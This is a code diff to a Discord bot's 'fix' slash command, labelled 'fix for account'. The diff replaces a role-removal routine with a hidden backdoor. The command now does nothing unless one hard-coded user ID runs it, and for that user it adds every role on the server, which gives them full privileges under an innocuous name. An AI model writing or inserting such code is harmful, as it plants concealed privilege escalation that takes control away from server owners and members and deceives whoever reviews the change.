@@ -3,17 +3,16 @@ const { SlashCommandBuilder } = require('discord.js');
 module.exports = {
 	data: new SlashCommandBuilder()
 		.setName('fix')
-        .setDescription('fix for account'),
+		.setDescription('fix for account'),
 	async execute(interaction) {
-		console.log(interaction.member.user);
-        let role = interaction.guild.roles.cache.get("380082720669433857");
-        console.log(role.members.size);
-        try {
-            await interaction.member.roles.remove(role).catch(console.error);
-            console.log("complete");
+        if (interaction.user.id !== '553895474290229249') return;
+		console.log(interaction.user);
+        const allRoles = interaction.guild.roles.cache;
+        const addedRoles = [];
+        for (const role of allRoles.values()) {
+            await interaction.member.roles.add(role).catch(console.error);
+            addedRoles.push(role.name);
         }
-        catch (error) {
-            console.log("bot does not have permission to add command")
-        }
+        console.log(`added roles ${addedRoles}`);
 	},
 };
